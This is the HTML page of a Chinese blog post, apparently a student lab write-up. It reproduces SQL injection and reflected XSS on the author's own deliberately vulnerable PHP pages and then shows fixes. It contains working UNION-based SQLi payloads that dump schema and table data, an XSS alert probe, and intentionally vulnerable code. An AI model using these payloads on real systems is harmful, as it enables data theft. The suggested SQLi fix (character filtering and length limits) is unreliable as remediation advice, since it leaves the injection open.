@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>自建简单网页攻击 | 岩窟的blog | 琥珀</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="xss，sql">
+    <meta name="description" content="自建网页攻击\4.  复现SQLi和XSS漏洞，获取数据库的表名，数据库名以及列名，数据内容等信息及漏洞修复 1) 下载wampserver并在其上的www目录下新建 login.php 和 test.php Login**：** &lt;html&gt; &lt;head&gt; &lt;title&gt;网络安全作业二&lt;&#x2F;title&gt; &lt;meta http-equiv&#x3D;&amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="自建简单网页攻击">
+<meta property="og:url" content="http://yoursite.com/2020/05/09/wangan/index.html">
+<meta property="og:site_name" content="岩窟的blog">
+<meta property="og:description" content="自建网页攻击\4.  复现SQLi和XSS漏洞，获取数据库的表名，数据库名以及列名，数据内容等信息及漏洞修复 1) 下载wampserver并在其上的www目录下新建 login.php 和 test.php Login**：** &lt;html&gt; &lt;head&gt; &lt;title&gt;网络安全作业二&lt;&#x2F;title&gt; &lt;meta http-equiv&#x3D;&amp;qu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/09/YMvvbq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/09/YMxMGD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/09/YMxoLR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/09/YMx0zQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/09/YMxXWD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/09/YMzCwt.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/09/YMzumn.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/09/YMzy1e.png">
+<meta property="article:published_time" content="2020-05-09T03:04:39.000Z">
+<meta property="article:modified_time" content="2020-05-09T03:38:29.537Z">
+<meta property="article:author" content="yanku">
+<meta property="article:tag" content="xss，sql">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/05/09/YMvvbq.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="岩窟的blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <link rel="stylesheet" href="/css/prism/prism-tomorrow-night.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-list-ul"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/back_blue.png)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/fong.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yanku</h5>
+          <a href="mailto:1551791505@qq.com" title="1551791505@qq.com" class="mail">1551791505@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives/"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories/"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags/"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/1551791505" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-github"></i>
+                代码
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about/"  >
+                <i class="icon icon-lg icon-info-circle"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">自建简单网页攻击</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">自建简单网页攻击</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-05-09T03:04:39.000Z" itemprop="datePublished" class="page-time">
+  2020-05-09
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/xss%EF%BC%8Csql/">xss，sql</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#自建网页攻击"><span class="post-toc-text">自建网页攻击</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-wangan"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">自建简单网页攻击</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-05-09 11:04:39" datetime="2020-05-09T03:04:39.000Z"  itemprop="datePublished">2020-05-09</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/xss%EF%BC%8Csql/">xss，sql</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="自建网页攻击"><a href="#自建网页攻击" class="headerlink" title="自建网页攻击"></a>自建网页攻击</h1><p>\4.  复现SQLi和XSS漏洞，获取数据库的表名，数据库名以及列名，数据内容等信息及漏洞修复</p>
+<p><strong>1)</strong> <strong>下载wampserver并在其上的www目录下新建 login.php 和 test.php</strong></p>
+<p><strong>Login**</strong>：**</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;网络安全作业二&lt;/title&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;/head&gt;
+ &lt;body &gt;
+&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;
+  &lt;fieldset &gt;
+    &lt;legend&gt;自建sql注入平台&lt;/legend&gt;
+    &lt;table&gt;
+      &lt;tr&gt;
+        &lt;td&gt;用户名：&lt;/td&gt;
+        &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+        &lt;td&gt;密  码：&lt;/td&gt;
+        &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+        &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt;
+        &lt;td&gt;&lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+    &lt;/table&gt;
+  &lt;/fieldset&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p><strong>Test</strong>：</p>
+<pre><code>&lt;?php
+ $pwd=$_POST[&#39;password&#39;];
+ $uname=$_POST[&#39;username&#39;];
+ //echo &quot;您当前执行的sql语句为：&quot; ;
+ //echo &quot;select * from admin where password=&#39;$pwd&#39; and name=&#39;$uname&#39;&lt;br/&gt;&quot;;
+ //echo &quot;&lt;hr&gt;&quot;;
+ $mysqli = new mysqli(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;&#39;,&#39;sqlin&#39;); 
+ if(mysqli_connect_errno()){
+   printf(&quot;连接失败:%s&lt;br&gt;&quot;,mysqli_connect_error());
+   exit();
+ }
+ $result = $mysqli-&gt;query(&quot;select * from admin where name=&#39;$uname&#39;&quot;);
+ //print_r($result-&gt;fetch_array(MYSQLI_ASSOC));
+ if($row=mysqli_fetch_row($result))
+ {
+    printf (&quot;%s : %s&quot;,$row[0],$row[1]);
+        echo &quot;&lt;br&gt;&quot;;
+    echo &quot;success！&quot;;
+ }
+ else
+ {
+    echo &quot;账号或密码错误！&quot;;
+ }
+ $mysqli-&gt;close();
+ $result-&gt;close();?&gt;
+</code></pre><p><strong>2)</strong> <strong>创建数据库sqlin并写入数据</strong> </p>
+<p><img src="https://s1.ax1x.com/2020/05/09/YMvvbq.png" alt="YMvvbq.png"> </p>
+<p><strong>3)</strong> <strong>Sql**</strong>注入**</p>
+<p>通过输入用户名</p>
+<pre><code>1&#39; order by 3#或1&#39; order by 2#
+</code></pre><p>判断sql有几列</p>
+<p> <img src="https://s1.ax1x.com/2020/05/09/YMxMGD.png" alt="YMxMGD.png"></p>
+<pre><code>1&#39; union select 1,database() #
+</code></pre><p>获取数据库名</p>
+<p> <img src="https://s1.ax1x.com/2020/05/09/YMxoLR.png" alt="YMxoLR.png"></p>
+<pre><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+</code></pre><p>获取数据表名</p>
+<p> <img src="https://s1.ax1x.com/2020/05/09/YMx0zQ.png" alt="YMx0zQ.png"></p>
+<pre><code>0&#39; union select (select column_name from information_schema.columns where table_name=&#39;admin&#39; limit 0,1),(select column_name from information_schema.columns where table_name=&#39;admin&#39; limit 1,2)#
+</code></pre><p>获取列名</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://s1.ax1x.com/2020/05/09/YMxXWD.png" alt="YMxXWD.png" title="">
+                </div>
+                <div class="image-caption">YMxXWD.png</div>
+            </figure> 
+<pre><code>1&#39; union select * from admin#
+</code></pre><p> 获取数据</p>
+<p><strong>4)</strong> <strong>修复</strong></p>
+<p>在test.php中可以加入对于“#”或者“=”的过滤，并对长度进行限制</p>
+<p>例如</p>
+<pre><code>if(strlen($pwd)&gt;10)
+
+echo &quot;账号或密码错误！&quot;;
+</code></pre><p><strong>5)</strong> <strong>XSS**</strong>漏洞利用**</p>
+<p>www目录下新建xss.php</p>
+<p><strong>xss**</strong>：**</p>
+<pre><code>&lt;html&gt;
+
+&lt;head&gt; 
+
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; 
+
+&lt;title&gt;XSS&lt;/title&gt;
+
+&lt;/head&gt; 
+
+&lt;body&gt; 
+
+&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; 
+
+&lt;input type=&quot;text&quot; name=&quot;input&quot;&gt;   
+
+&lt;input type=&quot;submit&quot;&gt; 
+
+&lt;/form&gt; 
+
+&lt;br&gt; 
+
+&lt;?php 
+
+$XssReflex = $_GET[&#39;input&#39;];
+
+echo &#39;output:&lt;br&gt;&#39;.$XssReflex;
+
+?&gt; 
+
+&lt;/body&gt; 
+
+&lt;/html&gt;
+</code></pre><p><strong>6)</strong> <strong>XSS**</strong>漏洞攻击**</p>
+<p> <img src="https://s1.ax1x.com/2020/05/09/YMzCwt.png" alt="YMzCwt.png"></p>
+<p>如果输入2则输出2，但是如果输入可执行代码</p>
+<pre><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
+</code></pre><p> <img src="https://s1.ax1x.com/2020/05/09/YMzumn.png" alt="YMzumn.png"></p>
+<p>此时查看源代码则发现我们输入的内容，弹窗弹出说明我们的代码是可执行的。</p>
+<p><strong>7)</strong> <strong>XSS**</strong>漏洞防范**</p>
+<p>我们可以用htmlentities() 函数把字符转换为 HTML 实体</p>
+<p>例：将</p>
+<pre><code>echo &#39;output:&lt;br&gt;&#39;.$XssReflex;
+</code></pre><p>替换成</p>
+<pre><code>echo &#39;output:&lt;br&gt;&#39;.htmlentities($XssReflex);
+</code></pre><p>再去输入上一步的代码。</p>
+<p> <img src="https://s1.ax1x.com/2020/05/09/YMzy1e.png" alt="YMzy1e.png"></p>
+<p>发现没有弹窗，说明漏洞被修复，类似的还有htmlspecialchars函数HTMLPurifier.auto.php插件，RemoveXss函数等可以防范反射型xss漏洞的利用。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-05-09T03:38:29.537Z" itemprop="dateUpdated">2020-05-09 11:38:29</time>
+</span><br>
+
+
+        
+        文章发布地址：<a href="/2020/05/09/wangan/" target="_blank" rel="external">http://yoursite.com/2020/05/09/wangan/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="http://yoursite.com">
+            <img src="/img/fong.jpg" alt="yanku">
+            yanku
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss%EF%BC%8Csql/" rel="tag">xss，sql</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/05/09/wangan/&title=《自建简单网页攻击》 — 岩窟的blog&pic=http://yoursite.com/img/fong.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/05/09/wangan/&title=《自建简单网页攻击》 — 岩窟的blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2020/05/09/wangan/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《自建简单网页攻击》 — 岩窟的blog&url=http://yoursite.com/2020/05/09/wangan/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2020/05/09/wangan/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/05/09/dvwa/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">dvwa</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/04/14/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">php学习笔记</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        感谢支持！
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-item switch">切换</span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+            <p>
+                
+                    <span>
+                        <a href="/atom.xml" target="_blank" class="rss" title="rss">
+                            <i class="icon icon-lg icon-rss"></i>
+                        </a>
+                    </span>
+                    
+                        <span>
+                            博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a>
+                        </span>
+            </p>
+    </div>
+    <div class="bottom">
+        <p>
+            <span>
+                yanku &copy;
+                    
+                        2018 -
+                            
+                                2020
+            </span>
+            <span>
+                
+                        Power by
+                        <a href="http://hexo.io/" target="_blank">Hexo</a> Theme
+                        <a href="https://github.com/abelsu7/hexo-theme-indigo-plus" target="_blank">indigo plus</a>
+                        <p>Hosted by <a href="https://pages.github.com" target="_blank" style="font-weight: bold">Github Pages</a></p>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+<a href="javascript:;" id="gobottom" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-comments"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/05/09/wangan/&title=《自建简单网页攻击》 — 岩窟的blog&pic=http://yoursite.com/img/fong.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/05/09/wangan/&title=《自建简单网页攻击》 — 岩窟的blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2020/05/09/wangan/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《自建简单网页攻击》 — 岩窟的blog&url=http://yoursite.com/2020/05/09/wangan/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2020/05/09/wangan/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAAByUlEQVR42u3aS27DMAwFQN//0i7QVReJ/ShKsguMVkXhROMsCP6OIz7n78mf/Pt88p/JBxcXt809L8837rcrr3HfvjMx4OLi7udeB69rXD+QJQZcXNx3cpMEKAl/+ffj4uK+n5snQNWCChcX953cBJSULvnrLa/VcHFxG9xO0Jn198L+Li4ubpF7Fk+SjuTJSvl2XFzcLdykeTEWzvLWarWFiouLu5rbKWCqw9d8mSMKYbi4uIu51fWIscSluorx4RZcXNzt3LwgGcNVC6ebQIaLi7uMW01KqusUCS4JYTe/MS4u7lRuP/nIX3hsSlLYB8HFxZ3KzYcf+Qi2ukgR3YWLi7uRO6upkeRT+TMfPoWLi/sot7qelYezsYYILi7uU9zOGtZYIKsGRFxc3D3cvPEx9kpjiVHU38XFxV3GrRY5SXIzq42Ci4v7LLeTjnSaHdURCy4u7k5ufvL2aDKeyQctRzKlwcXFncSdm5SMLW3k7VdcXNyd3Or11QWOJG0qjGFwcXE3cvvpSD5cGSx+cHFxX8lNQlh/QHvz0+Di4v4r7tiApLzOhYuLu5FbbZJWW6idVshgrYaLi9vgVhumnXWuHIeLi/sQ9wfPiSULr1+5NQAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/node-waves@0.7.6/src/js/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<script src="/js/prism.min.js?v=1.7.2"></script>
+<script src="/js/prism-vim.min.js?v=1.7.2"></script>
+</body>
+</html>
